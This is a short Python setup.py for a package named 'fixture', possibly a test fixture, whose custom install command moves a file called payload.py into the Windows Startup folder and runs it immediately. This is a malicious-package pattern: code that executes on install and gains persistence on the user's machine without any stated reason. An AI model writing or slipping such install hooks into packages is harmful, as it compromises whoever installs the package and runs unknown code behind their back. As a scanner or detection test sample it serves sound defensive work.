import os
from setuptools import setup
from setuptools.command.install import install

class Install(install):
    def run(self):
        startup = rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\boot"
        os.rename(os.path.join("download", "payload.py"), os.path.join(startup, "payload.py"))
        os.startfile(os.path.join(startup, "payload.py"))
        install.run(self)

setup(name="fixture", version="1.0", cmdclass={"install": Install})
